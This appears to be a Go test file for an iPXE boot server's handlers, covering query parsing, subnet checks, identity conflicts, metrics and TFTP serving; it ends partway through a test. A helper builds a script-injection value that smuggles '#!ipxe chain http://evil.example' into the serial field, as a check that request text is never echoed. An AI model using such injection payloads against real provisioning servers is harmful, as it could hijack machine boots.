package boot

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"net/netip"
	"net/url"
	"strings"
	"testing"
	"time"
	"unicode/utf8"

	"go.jacaudi.dev/hephaestus/internal/boot/ipxe"
	"go.jacaudi.dev/hephaestus/internal/catalog"
	"go.jacaudi.dev/hephaestus/internal/catalog/catalogtest"
	"go.jacaudi.dev/hephaestus/internal/db"
	"go.jacaudi.dev/hephaestus/internal/db/dbtest"
	"go.jacaudi.dev/hephaestus/internal/fleet"
	"go.jacaudi.dev/hephaestus/internal/store"
	"go.jacaudi.dev/hephaestus/internal/telemetry"
)

const (
	testClientAddr = "10.10.20.50:40000"
	testAddress    = "10.10.20.5"
	bootUUID       = "4c4c4544-0042-3510-8052-b4c04f4e4d32"
	bootMAC        = "aa:bb:cc:00:00:01"
	zeroUUID       = "00000000-0000-0000-0000-000000000000"

	// bootQ is a boot query as iPXE sends it.
	bootQ = "uuid=" + bootUUID + "&mac=aa-bb-cc-00-00-01&arch=x86_64&serial=S1&product=P1"
	// efiQ is bootQ from a machine booting with UEFI firmware.
	efiQ = bootQ + "&platform=efi"

	holdingConflict = "holding: identity conflict"
)

// queryWith is bootQ with the given serial and product.
func queryWith(serial, product string) string {
	return "uuid=" + bootUUID + "&mac=aa-bb-cc-00-00-01&arch=x86_64&serial=" + serial + "&product=" + product
}

// zeroQuery is a boot query whose UUID is the junk all-zero pattern.
func zeroQuery(serial string) string {
	return "uuid=" + zeroUUID + "&mac=aa-bb-cc-00-00-01&arch=x86_64&serial=" + serial + "&product=P1"
}

// hostileQuery is a boot query whose serial and product try to inject script text.
func hostileQuery() string {
	return queryWith("S1%0A%23!ipxe%0Achain%20http://evil.example", "%24%7Bevil%7D")
}

// oversizeQuery is a boot query whose serial is over maxValueBytes.
func oversizeQuery() string { return queryWith(strings.Repeat("a", 300), "P1") }

// unidentifiedQuery is a boot query with neither a UUID nor a MAC.
const unidentifiedQuery = "arch=x86_64&serial=S1&product=P1"

// parseCase is one TestParseBootQuery case.
type parseCase struct {
	name    string
	query   string
	want    Request
	wantErr error
}

// parseCases are the TestParseBootQuery cases.
func parseCases() []parseCase {
	long := strings.Repeat("a", maxValueBytes+1)
	return []parseCase{
		{"normalized", "uuid=4C4C4544-0042-3510-8052-B4C04F4E4D32&mac=AA-BB-CC-00-00-01&arch=arm64&serial=S1&product=P1",
			Request{UUID: bootUUID, MAC: bootMAC, Serial: "S1", Product: "P1", Arch: fleet.ArchARM64}, nil},
		{"x86_64 is amd64", bootQ, Request{UUID: bootUUID, MAC: bootMAC, Serial: "S1", Product: "P1", Arch: fleet.ArchAMD64}, nil},
		{"malformed UUID and MAC", "uuid=nope&mac=nope&arch=x86_64&serial=S&product=P",
			Request{Serial: "S", Product: "P", Arch: fleet.ArchAMD64}, nil},
		{"nothing", "", Request{Arch: fleet.ArchAMD64}, nil},
		{"NUL and invalid UTF-8 dropped", "serial=a%00b%FFc&product=%00",
			Request{Serial: "abc", Arch: fleet.ArchAMD64}, nil},
		{"longest allowed", "serial=" + strings.Repeat("a", maxValueBytes),
			Request{Serial: strings.Repeat("a", maxValueBytes), Arch: fleet.ArchAMD64}, nil},
		{"long uuid", "uuid=" + long, Request{}, errValueTooLong},
		{"long mac", "mac=" + long, Request{}, errValueTooLong},
		{"long serial", "serial=" + long, Request{}, errValueTooLong},
		{"long product", "product=" + long, Request{}, errValueTooLong},
		{"long arch", "arch=" + long, Request{}, errValueTooLong},
		{"platform efi", "platform=efi", Request{Arch: fleet.ArchAMD64, Platform: catalog.PlatformEFI}, nil},
		{"platform pcbios", "platform=pcbios", Request{Arch: fleet.ArchAMD64, Platform: catalog.PlatformPCBIOS}, nil},
		{"platform linux is unknown", "platform=linux", Request{Arch: fleet.ArchAMD64}, nil},
		{"platform missing is unknown", "serial=S1", Request{Serial: "S1", Arch: fleet.ArchAMD64}, nil},
		{"long platform", "platform=" + strings.Repeat("a", 300), Request{}, errValueTooLong},
	}
}

// bootQueries are the queries the tests send: every TestParseBootQuery query and
// every query the handler tests build. FuzzParseBootQuery seeds with them.
func bootQueries() []string {
	qs := []string{
		bootQ, queryWith("S2", "P1"), hostileQuery(), oversizeQuery(),
		zeroQuery("S1"), zeroQuery("S2"), unidentifiedQuery,
		efiQ, bootQ + "&platform=pcbios", bootQ + "&platform=linux",
	}
	cases := parseCases()
	for i := range cases {
		qs = append(qs, cases[i].query)
	}
	return qs
}

func testNow() time.Time { return time.Date(2026, 11, 14, 12, 0, 0, 0, time.UTC) }

func testFiles() map[string][]byte {
	return map[string][]byte{"amd64/snp.efi": []byte("amd64-efi"), "arm64/snp.efi": []byte("arm64-efi")}
}

func testSubnet() netip.Prefix { return netip.MustParsePrefix("10.10.20.0/24") }

// newRequest is a GET from the provisioning subnet; secure makes it a TLS request.
func newRequest(t *testing.T, target string, secure bool) *http.Request {
	t.Helper()
	req := httptest.NewRequestWithContext(t.Context(), http.MethodGet, target, nil)
	req.RemoteAddr = testClientAddr
	if secure {
		req.TLS = &tls.ConnectionState{}
	}
	return req
}

// testConfig is the handlers' Config over repo, with a store at storeRoot, the
// fixture catalog and the test address. It returns the fixture whose bytes
// catalogtest.Stock puts in the store.
func testConfig(t *testing.T, repo *fleet.Repository, storeRoot string) (Config, catalogtest.Fixture) {
	t.Helper()
	st, _, err := store.Open(t.Context(), storeRoot, time.Now)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	fix := catalogtest.New(t, "https://upstream.invalid")
	return Config{
		Repo: repo, Store: st, Catalog: fix.Catalog, FQDN: testFQDN,
		Address: netip.MustParseAddr(testAddress), Subnet: testSubnet(), Files: testFiles(),
	}, fix
}

// rig is the handlers over a migrated SQLite database, a store and the fixture
// catalog.
type rig struct {
	t    *testing.T
	d    *db.DB
	repo *fleet.Repository
	st   *store.Store
	// storeRoot is the directory the store lives in.
	storeRoot string
	fix       catalogtest.Fixture
	h         *Handlers
	// errs are what the handlers reported to their error handler.
	errs []error
}

func newRig(t *testing.T, opts ...Option) *rig {
	t.Helper()
	return newRigWith(t, func(*Config) {}, opts...)
}

// newRigWith is newRig with mod applied to the handlers' Config.
func newRigWith(t *testing.T, mod func(*Config), opts ...Option) *rig {
	t.Helper()
	d := dbtest.SQLite(t)
	repo := fleet.NewRepository(d)
	root := t.TempDir()
	cfg, fix := testConfig(t, repo, root)
	mod(&cfg)
	g := &rig{t: t, d: d, repo: repo, st: cfg.Store, storeRoot: root, fix: fix}
	opts = append([]Option{WithClock(testNow), WithErrorHandler(func(_ context.Context, err error) {
		g.errs = append(g.errs, err)
	})}, opts...)
	h, err := NewHandlers(cfg, opts...)
	if err != nil {
		t.Fatalf("NewHandlers: %v", err)
	}
	g.h = h
	return g
}

// plain serves a plain-HTTP GET through PlainHTTP.
func (g *rig) plain(target string) *httptest.ResponseRecorder {
	g.t.Helper()
	rec := httptest.NewRecorder()
	g.h.PlainHTTP().ServeHTTP(rec, newRequest(g.t, target, false))
	return rec
}

// secure serves a TLS GET through TLS.
func (g *rig) secure(target string) *httptest.ResponseRecorder {
	g.t.Helper()
	rec := httptest.NewRecorder()
	g.h.TLS().ServeHTTP(rec, newRequest(g.t, target, true))
	return rec
}

// wide serves a TLS GET through WideEvents around TLS and returns the one log line.
func (g *rig) wide(target string) (*httptest.ResponseRecorder, map[string]any) {
	g.t.Helper()
	var buf bytes.Buffer
	logger := slog.New(slog.NewJSONHandler(&buf, nil))
	rec := httptest.NewRecorder()
	telemetry.WideEvents(g.h.TLS(), logger, slog.LevelInfo).ServeHTTP(rec, newRequest(g.t, target, true))

	var line map[string]any
	if err := json.Unmarshal(buf.Bytes(), &line); err != nil {
		g.t.Fatalf("log line is not one JSON object: %v\n%s", err, buf.String())
	}
	return rec, line
}

// boot serves a TLS /boot with query and requires a 200.
func (g *rig) boot(query string) string {
	g.t.Helper()
	rec := g.secure("/boot?" + query)
	if rec.Code != http.StatusOK {
		g.t.Fatalf("GET /boot?%s: status %d, body %q", query, rec.Code, rec.Body.String())
	}
	return rec.Body.String()
}

func (g *rig) exec(query string, args ...any) {
	g.t.Helper()
	if _, err := g.d.Bun().ExecContext(g.t.Context(), query, args...); err != nil {
		g.t.Fatalf("%s: %v", query, err)
	}
}

func (g *rig) count(query string, args ...any) int {
	g.t.Helper()
	var n int
	if err := g.d.Bun().NewRaw(query, args...).Scan(g.t.Context(), &n); err != nil {
		g.t.Fatalf("%s: %v", query, err)
	}
	return n
}

// machine is the fixture machine, which must exist.
func (g *rig) machine() fleet.Machine {
	g.t.Helper()
	m, ok, err := g.repo.Lookup(g.t.Context(), fleet.Identity{UUID: bootUUID, MAC: bootMAC})
	if err != nil || !ok {
		g.t.Fatalf("Lookup fixture machine = %v, %v", ok, err)
	}
	return m
}

// setState forces the fixture machine into state s.
func (g *rig) setState(s fleet.State) {
	g.t.Helper()
	g.exec("UPDATE machines SET state = ? WHERE smbios_uuid = ?", string(s), bootUUID)
}

// maxBodyShown is how much of a response body a failed wantStatus prints.
const maxBodyShown = 256

func wantStatus(t *testing.T, rec *httptest.ResponseRecorder, want int) {
	t.Helper()
	if rec.Code != want {
		body := rec.Body.String()
		if len(body) > maxBodyShown {
			body = body[:maxBodyShown] + "..."
		}
		t.Fatalf("status = %d, want %d (body %q, %d bytes in all)", rec.Code, want, body, rec.Body.Len())
	}
}

func TestHandlers_GuardedBySubnet(t *testing.T) {
	g := newRig(t)
	cases := []struct {
		name   string
		h      http.Handler
		secure bool
	}{
		{"PlainHTTP", g.h.PlainHTTP(), false},
		{"TLS", g.h.TLS(), true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			req := newRequest(t, "/boot?"+bootQ, tc.secure)
			req.RemoteAddr = "10.10.30.5:1"
			rec := httptest.NewRecorder()

			tc.h.ServeHTTP(rec, req)

			wantStatus(t, rec, http.StatusForbidden)
			if rec.Body.Len() != 0 {
				t.Errorf("body = %q, want empty", rec.Body.String())
			}
			if n := g.count("SELECT count(*) FROM machines"); n != 0 {
				t.Errorf("machines = %d, want 0", n)
			}
		})
	}
}

func TestStart_StaticScript(t *testing.T) {
	g := newRig(t)

	rec := g.plain("/start?uuid=x&serial=%0Aevil")

	wantStatus(t, rec, http.StatusOK)
	if got, want := rec.Body.String(), StartScript(testFQDN); got != want {
		t.Errorf("body = %q, want %q", got, want)
	}
	if strings.Contains(rec.Body.String(), "evil") {
		t.Errorf("body echoes the request: %q", rec.Body.String())
	}
	if got, want := rec.Header().Get("Content-Type"), "text/plain; charset=utf-8"; got != want {
		t.Errorf("Content-Type = %q, want %q", got, want)
	}
}

func TestBootPlain_ChainsToTLS(t *testing.T) {
	g := newRig(t)

	rec := g.plain("/boot?" + bootQ)

	wantStatus(t, rec, http.StatusOK)
	if got, want := rec.Body.String(), StartScript(testFQDN); got != want {
		t.Errorf("body = %q, want %q", got, want)
	}
	if n := g.count("SELECT count(*) FROM machines"); n != 0 {
		t.Errorf("machines = %d, want 0", n)
	}
}

func TestBootPlain_OversizeStillChains(t *testing.T) {
	g := newRig(t)

	rec := g.plain("/boot?" + oversizeQuery())

	wantStatus(t, rec, http.StatusOK)
	if got, want := rec.Body.String(), StartScript(testFQDN); got != want {
		t.Errorf("body = %q, want %q", got, want)
	}
}

func TestBoot_UnknownLocalReportsAndExits(t *testing.T) {
	g := newRig(t)

	rec := g.secure("/boot?" + bootQ)

	wantStatus(t, rec, http.StatusOK)
	body := rec.Body.String()
	if !strings.HasPrefix(body, "#!ipxe\nparams\n") || !strings.HasSuffix(body, "exit\n") {
		t.Errorf("body is not the report then exit: %q", body)
	}
	if got, want := rec.Header().Get("Content-Type"), "text/plain; charset=utf-8"; got != want {
		t.Errorf("Content-Type = %q, want %q", got, want)
	}
	m := g.machine()
	if m.State != fleet.StateDiscovered || len(m.MACs) != 1 || m.MACs[0] != bootMAC || m.Arch != fleet.ArchAMD64 {
		t.Errorf("machine = state %q MACs %v arch %q, want discovered [%s] amd64", m.State, m.MACs, m.Arch, bootMAC)
	}
	if !m.LastSeenAt.Equal(testNow()) {
		t.Errorf("LastSeenAt = %v, want the injected clock %v", m.LastSeenAt, testNow())
	}
	if n := g.count("SELECT count(*) FROM boot_events"); n != 1 {
		t.Errorf("boot events = %d, want 1", n)
	}
	if n := g.count("SELECT count(*) FROM boot_events WHERE decision_row = 7 AND action = 'exit'"); n != 1 {
		t.Errorf("row 7 exit events = %d, want 1", n)
	}
}

func TestBoot_UnknownHoldReportsAndHolds(t *testing.T) {
	g := newRig(t)
	if err := g.repo.SetUnknownAction(t.Context(), fleet.UnknownActionHold, "admin", testNow()); err != nil {
		t.Fatalf("SetUnknownAction: %v", err)
	}

	body := g.boot(bootQ)

	if !strings.HasPrefix(body, "#!ipxe\nparams\n") || !strings.Contains(body, "echo hephaestus: holding: awaiting approval") {
		t.Errorf("body is not the report then hold: %q", body)
	}
}

func TestBoot_RequestTextNeverEchoed(t *testing.T) {
	g := newRig(t)
	q := hostileQuery()

	for _, pass := range []string{"first contact", "known machine"} {
		body := g.boot(q)
		if strings.Contains(body, "evil") || strings.Contains(body, "chain http://evil") {
			t.Errorf("%s: body echoes the request: %q", pass, body)
		}
	}
}

func TestBoot_IdentityConflictHolds(t *testing.T) {
	g := newRig(t)
	g.boot(bootQ)

	for range 2 {
		if body := g.boot(queryWith("S2", "P1")); !strings.Contains(body, holdingConflict) {
			t.Errorf("body = %q, want it to contain %q", body, holdingConflict)
		}
		if !g.machine().Junk {
			t.Error("machine is not marked junk")
		}
		if n := g.count("SELECT count(*) FROM audit_events WHERE action = 'alert.uuid_conflict'"); n != 1 {
			t.Errorf("alert rows = %d, want 1", n)
		}
	}
}

func TestBoot_JunkPatternUUIDConflictViaMAC(t *testing.T) {
	g := newRig(t)
	g.boot(zeroQuery("S1"))

	// The machine is found by the MAC it owns. Its junk-pattern UUID is junk from the first
	// boot, so as in fleet.Observe the conflict holds without a second mark or an alert.
	if body := g.boot(zeroQuery("S2")); !strings.Contains(body, holdingConflict) {
		t.Errorf("body = %q, want it to contain %q", body, holdingConflict)
	}
	if n := g.count("SELECT count(*) FROM machines"); n != 1 {
		t.Errorf("machines = %d, want 1", n)
	}
	if n := g.count("SELECT count(*) FROM boot_events WHERE decision_row = 2"); n != 1 {
		t.Errorf("row 2 events = %d, want 1", n)
	}
	if n := g.count("SELECT count(*) FROM audit_events WHERE action = 'alert.uuid_conflict'"); n != 0 {
		t.Errorf("alert rows = %d, want 0", n)
	}
}

// TestBoot_JunkPatternUUIDNeverMatchesValidUUIDMachine pins that a request with
// no or a junk-pattern UUID is its own machine, never the valid-UUID machine that
// owns the MAC it names: that machine keeps its UUID and its state.
func TestBoot_JunkPatternUUIDNeverMatchesValidUUIDMachine(t *testing.T) {
	const noUUID = "mac=aa-bb-cc-00-00-01&arch=x86_64&serial=%s&product=P1"
	tests := []struct {
		name  string
		query string
	}{
		{"zero UUID, other serial", zeroQuery("S2")},
		{"zero UUID, same serial and product", zeroQuery("S1")},
		{"no UUID, other serial", fmt.Sprintf(noUUID, "S2")},
		{"no UUID, same serial and product", fmt.Sprintf(noUUID, "S1")},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			g := newRig(t)
			g.boot(bootQ)
			g.setState(fleet.StateInstalling)

			if body := g.boot(tc.query); strings.Contains(body, holdingConflict) {
				t.Errorf("body = %q, want no identity conflict", body)
			}

			m := g.machine()
			if m.Junk || m.State != fleet.StateInstalling {
				t.Errorf("valid-UUID machine = junk %v, state %s; want not junk, still installing", m.Junk, m.State)
			}
			if n := g.count("SELECT count(*) FROM machines"); n != 2 {
				t.Errorf("machines = %d, want 2 (the request got its own record)", n)
			}
			if n := g.count("SELECT count(*) FROM audit_events WHERE action = 'alert.uuid_conflict'"); n != 0 {
				t.Errorf("alert rows = %d, want 0", n)
			}
		})
	}
}

// TestBoot_NoConfigSourceHolds pins M2's behaviour without a config source: an
// assigned machine holds at row 8 even when its assets are ready.
func TestBoot_NoConfigSourceHolds(t *testing.T) {
	g := newRig(t)
	g.assign()
	g.stockTalos(fixtureCmdline)

	wantHold(t, g.boot(bootQ), "boot assets not ready")

	if n := g.count("SELECT count(*) FROM tickets"); n != 0 {
		t.Errorf("tickets = %d, want 0", n)
	}
}

// adoptByUUID creates the fixture machine as machine adopt --uuid does:
// installed and bound, with no MACs and its identity not yet observed.
func (g *rig) adoptByUUID() fleet.Machine {
	g.t.Helper()
	m, err := fleet.AdoptByUUIDTx(g.t.Context(), g.d.Bun(), fleet.AdoptByUUIDRequest{
		UUID: bootUUID, Arch: fleet.ArchAMD64,
		Bind:  fleet.Binding{ClusterID: testCluster, Host: testHost, TalosSchematic: plainSchematic, TalosVersion: talosVersion},
		Guard: fleet.Guard{HostExists: true, HostUnbound: true},
		Actor: fleet.ActorCLI, At: testNow(),
	})
	if err != nil {
		g.t.Fatalf("AdoptByUUIDTx: %v", err)
	}
	return m
}

// get is the stored machine with id, which must exist.
func (g *rig) get(id string) fleet.Machine {
	g.t.Helper()
	m, err := g.repo.Get(g.t.Context(), id)
	if err != nil {
		g.t.Fatalf("Get %s: %v", id, err)
	}
	return m
}

// TestBoot_AdoptedFirstBootObservesIdentity pins that the first boot of an
// adopted machine stores its serial and product instead of meeting row 2: it
// is not marked junk and row 6 answers it.
func TestBoot_AdoptedFirstBootObservesIdentity(t *testing.T) {
	g := newRig(t)
	adopted := g.adoptByUUID()

	if got, want := g.boot(bootQ), "#!ipxe\nexit\n"; got != want {
		t.Errorf("body = %q, want %q", got, want)
	}

	m := g.get(adopted.ID)
	if m.Junk || !m.IdentityObserved || m.Serial != "S1" || m.Product != "P1" {
		t.Errorf("machine = junk %t, observed %t, serial %q, product %q; want not junk, observed S1/P1", m.Junk, m.IdentityObserved, m.Serial, m.Product)
	}
	if n := g.count("SELECT count(*) FROM audit_events WHERE action = 'alert.uuid_conflict'"); n != 0 {
		t.Errorf("alert rows = %d, want 0", n)
	}
}

// TestBoot_IdentityRaceRedecidesRow2 pins that a boot that loses the first
// report of an adopted machine's identity to a /discover is decided again from
// the fresh row: the serials differ, so row 2 holds and marks the UUID junk.
func TestBoot_IdentityRaceRedecidesRow2(t *testing.T) {
	metrics := newMetrics(t)
	clock := testNow
	g := newRig(t, WithMeter(metrics.Meter()), WithClock(func() time.Time { return clock() }))
	adopted := g.adoptByUUID()
	other := fleet.NewRepository(g.d)
	observed := false
	clock = func() time.Time {
		// The /boot handler has looked the machine up; a /discover reports it first.
		if !observed {
			observed = true
			id := fleet.Identity{UUID: bootUUID, Serial: "S1", Product: "P1"}
			if _, err := other.Observe(t.Context(), id, fleet.ArchAMD64, testNow()); err != nil {
				t.Fatalf("Observe: %v", err)
			}
		}
		return testNow()
	}

	body := g.boot(queryWith("S2", "P1"))

	if !strings.Contains(body, holdingConflict) {
		t.Errorf("body = %q, want it to contain %q", body, holdingConflict)
	}
	if n := g.count("SELECT count(*) FROM boot_events"); n != 1 {
		t.Errorf("boot events = %d, want 1", n)
	}
	if n := g.count("SELECT count(*) FROM boot_events WHERE decision_row = 2"); n != 1 {
		t.Errorf("row 2 events = %d, want 1", n)
	}
	if m := g.get(adopted.ID); !m.Junk || m.Serial != "S1" {
		t.Errorf("machine = junk %t, serial %q; want junk with the reported S1", m.Junk, m.Serial)
	}
	if n := g.count("SELECT count(*) FROM audit_events WHERE action = 'alert.uuid_conflict'"); n != 1 {
		t.Errorf("alert rows = %d, want 1", n)
	}
	if v, ok := metricLine(scrapeMetrics(t, metrics), `hephaestus_alerts_total{kind="uuid_conflict"`); !ok || v != "1" {
		t.Errorf(`hephaestus_alerts_total{kind="uuid_conflict"} = %q (found %t), want 1`, v, ok)
	}
	if len(g.errs) != 0 {
		t.Errorf("reported errors = %v, want none (no ErrBootNextRace)", g.errs)
	}
}

func TestBoot_InstalledExits(t *testing.T) {
	g := newRig(t)
	g.boot(bootQ)
	g.setState(fleet.StateInstalled)

	if got, want := g.boot(bootQ), "#!ipxe\nexit\n"; got != want {
		t.Errorf("body = %q, want %q", got, want)
	}
}

func TestBoot_InstallingBecomesUnconfirmed(t *testing.T) {
	g := newRig(t)
	g.boot(bootQ)
	g.setState(fleet.StateInstalling)

	if got, want := g.boot(bootQ), "#!ipxe\nexit\n"; got != want {
		t.Errorf("body = %q, want %q", got, want)
	}
	if got := g.machine().State; got != fleet.StateInstallUnconfirmed {
		t.Errorf("state = %q, want %q", got, fleet.StateInstallUnconfirmed)
	}
}

func TestBoot_OversizeParamRejected(t *testing.T) {
	g := newRig(t)

	rec := g.secure("/boot?" + oversizeQuery())

	wantStatus(t, rec, http.StatusBadRequest)
	if rec.Body.Len() != 0 {
		t.Errorf("body = %q, want empty", rec.Body.String())
	}
	if n := g.count("SELECT count(*) FROM machines"); n != 0 {
		t.Errorf("machines = %d, want 0", n)
	}
}

func TestBoot_UnidentifiableStillServesScript(t *testing.T) {
	g := newRig(t)

	rec, line := g.wide("/boot?" + unidentifiedQuery)

	wantStatus(t, rec, http.StatusOK)
	if !strings.HasPrefix(rec.Body.String(), "#!ipxe\nparams\n") {
		t.Errorf("body = %q, want the report script", rec.Body.String())
	}
	if line["unidentified"] != true {
		t.Errorf("log line = %v, want unidentified=true", line)
	}
	if n := g.count("SELECT count(*) FROM machines"); n != 0 {
		t.Errorf("machines = %d, want 0", n)
	}
}

func TestBoot_FleetFullStillServesScript(t *testing.T) {
	g := newRig(t)
	rows := make([]fleet.Machine, fleet.MaxMachines)
	for i := range rows {
		rows[i] = fleet.Machine{
			ID: fmt.Sprintf("m%04d", i), UUID: fmt.Sprintf("00000000-0000-4000-8000-%012d", i),
			Serial: "S", Product: "P", Arch: fleet.ArchAMD64, State: fleet.StateDiscovered, CreatedAt: testNow(), LastSeenAt: testNow(),
		}
	}
	if _, err := g.d.Bun().NewInsert().Model(&rows).Exec(t.Context()); err != nil {
		t.Fatalf("bulk insert: %v", err)
	}

	rec, line := g.wide("/boot?" + bootQ)

	wantStatus(t, rec, http.StatusOK)
	if !strings.HasPrefix(rec.Body.String(), "#!ipxe\nparams\n") {
		t.Errorf("body = %q, want the report script", rec.Body.String())
	}
	if line["fleet_full"] != true {
		t.Errorf("log line = %v, want fleet_full=true", line)
	}
}

func TestBoot_RepositoryErrorIs500(t *testing.T) {
	g := newRig(t)
	g.exec("DROP TABLE machine_macs")

	rec, line := g.wide("/boot?" + bootQ)

	wantStatus(t, rec, http.StatusInternalServerError)
	if got, want := rec.Body.String(), "internal error\n"; got != want {
		t.Errorf("body = %q, want %q", got, want)
	}
	if _, ok := line["error"]; !ok {
		t.Errorf("log line = %v, want an error attribute", line)
	}
}

func TestBoot_WideEventStateAfterTransition(t *testing.T) {
	g := newRig(t)
	g.boot(bootQ)
	g.setState(fleet.StateInstalling)

	rec, line := g.wide("/boot?" + bootQ)

	wantStatus(t, rec, http.StatusOK)
	want := map[string]any{"decision_row": float64(6), "action": "exit", "state": "install-unconfirmed", "machine_id": g.machine().ID}
	for k, v := range want {
		if line[k] != v {
			t.Errorf("log line %q = %v, want %v (line %v)", k, line[k], v, line)
		}
	}
	if q, _ := line["query"].(string); q != "[redacted]" {
		t.Errorf("log line query = %q, want [redacted]", q)
	}
}

func TestBoot_WideEventHoldReason(t *testing.T) {
	g := newRig(t)
	g.boot(bootQ)
	g.setState(fleet.StateRejected)

	_, line := g.wide("/boot?" + bootQ)

	if line["hold_reason"] != "machine is rejected" || line["action"] != "hold" {
		t.Errorf("log line = %v, want a hold with reason %q", line, "machine is rejected")
	}
}

// scrapeMetrics returns the Prometheus exposition body for m.
func scrapeMetrics(t *testing.T, m *telemetry.Metrics) string {
	t.Helper()
	rec := httptest.NewRecorder()
	m.Handler().ServeHTTP(rec, httptest.NewRequestWithContext(t.Context(), http.MethodGet, "/metrics", nil))
	return rec.Body.String()
}

func newMetrics(t *testing.T) *telemetry.Metrics {
	t.Helper()
	m, err := telemetry.NewMetrics("test", "test")
	if err != nil {
		t.Fatalf("NewMetrics: %v", err)
	}
	t.Cleanup(func() {
		if err := m.Shutdown(t.Context()); err != nil {
			t.Errorf("Shutdown: %v", err)
		}
	})
	return m
}

func TestBoot_MetricsCount(t *testing.T) {
	metrics := newMetrics(t)
	g := newRig(t, WithMeter(metrics.Meter()))

	g.boot(bootQ)

	if body := scrapeMetrics(t, metrics); !strings.Contains(body, `hephaestus_boot_decisions_total{action="exit",decision_row="7"`) {
		t.Errorf("metrics lack the row 7 exit decision:\n%s", body)
	}
}

func TestBoot_AlertCountedOnce(t *testing.T) {
	metrics := newMetrics(t)
	g := newRig(t, WithMeter(metrics.Meter()))
	g.boot(bootQ)

	g.boot(queryWith("S2", "P1"))
	g.boot(queryWith("S2", "P1"))

	body := scrapeMetrics(t, metrics)
	var found bool
	for line := range strings.SplitSeq(body, "\n") {
		if strings.HasPrefix(line, `hephaestus_alerts_total{kind="uuid_conflict"`) {
			found = true
			if !strings.HasSuffix(line, " 1") {
				t.Errorf("alert counter line = %q, want a count of 1", line)
			}
		}
	}
	if !found {
		t.Errorf("metrics lack hephaestus_alerts_total{kind=\"uuid_conflict\"}:\n%s", body)
	}
}

func TestParseBootQuery(t *testing.T) {
	for _, tc := range parseCases() {
		t.Run(tc.name, func(t *testing.T) {
			q, err := url.ParseQuery(tc.query)
			if err != nil {
				t.Fatalf("ParseQuery: %v", err)
			}
			got, err := parseBootQuery(q)
			if !errors.Is(err, tc.wantErr) {
				t.Fatalf("parseBootQuery error = %v, want %v", err, tc.wantErr)
			}
			if got != tc.want {
				t.Errorf("parseBootQuery = %+v, want %+v", got, tc.want)
			}
		})
	}
}

func FuzzParseBootQuery(f *testing.F) {
	for _, q := range bootQueries() {
		f.Add(q)
	}
	f.Fuzz(func(t *testing.T, raw string) {
		q, err := url.ParseQuery(raw)
		if err != nil {
			t.Skip()
		}
		got, err := parseBootQuery(q)
		if err != nil {
			return
		}
		if n := len(got.MAC); n != 0 && n != 17 {
			t.Errorf("MAC %q has %d bytes", got.MAC, n)
		}
		if n := len(got.UUID); n != 0 && n != 36 {
			t.Errorf("UUID %q has %d bytes", got.UUID, n)
		}
		for name, v := range map[string]string{"Serial": got.Serial, "Product": got.Product} {
			if len(v) > maxValueBytes || !utf8.ValidString(v) || strings.ContainsRune(v, 0) {
				t.Errorf("%s = %q, want valid text of at most %d bytes without NUL", name, v, maxValueBytes)
			}
		}
		if _, ok := catalog.ParsePlatform(string(got.Platform)); got.Platform != "" && !ok {
			t.Errorf("Platform = %q, want a recognised platform or empty", got.Platform)
		}
	})
}

func TestTFTPRoute(t *testing.T) {
	g := newRig(t)

	rec := g.plain("/tftp/amd64/snp.efi")
	wantStatus(t, rec, http.StatusOK)
	if rec.Body.String() != "amd64-efi" {
		t.Errorf("body = %q, want amd64-efi", rec.Body.String())
	}
	if got, want := rec.Header().Get("Content-Type"), "application/octet-stream"; got != want {
		t.Errorf("Content-Type = %q, want %q", got, want)
	}

	wantStatus(t, g.plain("/tftp/riscv64/snp.efi"), http.StatusNotFound)

	req := newRequest(t, "/tftp/amd64/snp.efi", false)
	req.Header.Set("Range", "bytes=0-3")
	ranged := httptest.NewRecorder()
	g.h.PlainHTTP().ServeHTTP(ranged, req)
	wantStatus(t, ranged, http.StatusPartialContent)
	if ranged.Body.String() != "amd6" {
		t.Errorf("ranged body = %q, want amd6", ranged.Body.String())
	}
}

func TestTFTPRoute_EmbeddedBinaries(t *testing.T) {
	files, err := ipxe.Files()
	if err != nil {
		t.Fatalf("ipxe.Files: %v", err)
	}
	cfg, _ := testConfig(t, fleet.NewRepository(dbtest.SQLite(t)), t.TempDir())
	cfg.Files = files
	h, err := NewHandlers(cfg, WithClock(testNow))
	if err != nil {
		t.Fatalf("NewHandlers: %v", err)
	}

	for _, arch := range []string{"amd64", "arm64"} {
		rec := httptest.NewRecorder()
		h.PlainHTTP().ServeHTTP(rec, newRequest(t, "/tftp/"+arch+"/snp.efi", false))

		wantStatus(t, rec, http.StatusOK)
		if want := files[arch+"/snp.efi"]; len(want) == 0 || !bytes.Equal(rec.Body.Bytes(), want) {
			t.Errorf("%s: served %d bytes, want the %d embedded bytes", arch, rec.Body.Len(), len(want))
		}
	}
}

func TestTFTPRoute_OnBothMuxes(t *testing.T) {
	files, err := ipxe.Files()
	if err != nil {
		t.Fatalf("ipxe.Files: %v", err)
	}
	cfg, _ := testConfig(t, fleet.NewRepository(dbtest.SQLite(t)), t.TempDir())
	cfg.Files = files
	h, err := NewHandlers(cfg, WithClock(testNow))
	if err != nil {
		t.Fatalf("NewHandlers: %v", err)
	}

	for _, mux := range []struct {
		name    string
		handler http.Handler
		secure  bool
	}{
		{"plain HTTP", h.PlainHTTP(), false},
		{"TLS", h.TLS(), true},
	} {
		for _, arch := range []string{"amd64", "arm64"} {
			rec := httptest.NewRecorder()
			mux.handler.ServeHTTP(rec, newRequest(t, "/tftp/"+arch+"/snp.efi", mux.secure))

			if rec.Code != http.StatusOK {
				t.Errorf("%s %s: status = %d, want 200", mux.name, arch, rec.Code)
				continue
			}
			if want := files[arch+"/snp.efi"]; len(want) == 0 || !bytes.Equal(rec.Body.Bytes(), want) {
				t.Errorf("%s %s: served %d bytes, want the %d embedded bytes", mux.name, arch, rec.Body.Len(), len(want))
			}
		}
	}
}

func TestTFTPRoute_DeadlineOnRealConn(t *testing.T) {
	cfg, _ := testConfig(t, fleet.NewRepository(dbtest.SQLite(t)), t.TempDir())
	cfg.Subnet = netip.MustParsePrefix("127.0.0.0/8")
	h, err := NewHandlers(cfg)
	if err != nil {
		t.Fatalf("NewHandlers: %v", err)
	}
	srv := httptest.NewServer(h.PlainHTTP())
	t.Cleanup(srv.Close)

